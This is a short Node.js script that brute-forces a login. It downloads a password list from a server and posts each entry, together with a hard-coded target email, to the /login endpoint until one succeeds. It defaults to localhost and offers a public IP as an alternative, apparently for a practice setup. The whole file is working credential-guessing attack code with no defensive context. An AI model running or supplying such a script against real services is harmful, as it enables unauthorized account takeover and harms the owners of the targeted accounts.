const axios = require('axios');

// --- CONFIG SECTION ---
const TARGET_EMAIL = 'ram@gmail.com'; // CHANGE to the email to test
const BASE_URL = 'http://localhost:80'; // Or 'http://3.7.253.11'
const PASSWORD_LIST_URL = `${BASE_URL}/password-list`;
const LOGIN_URL = `${BASE_URL}/login`;
// --- END CONFIG ---

async function main() {
  // Step 1: Get password list
  const { data: passwords } = await axios.get(PASSWORD_LIST_URL);
  console.log(`Got ${passwords.length} passwords. Trying them all for email: ${TARGET_EMAIL}...`);

  // Step 2: Try each password
  for (const password of passwords) {
    try {
      const res = await axios.post(LOGIN_URL, { email: TARGET_EMAIL, password });
      if (res.data && res.data.success) {
        console.log(`✅ Found working password for ${TARGET_EMAIL}: ${password}`);
        return; // Stop after first success
      }
    } catch (err) {
      // Ignore network errors for now
      continue;
    }
  }
  console.log(`❌ No working password found for ${TARGET_EMAIL}`);
}

main();

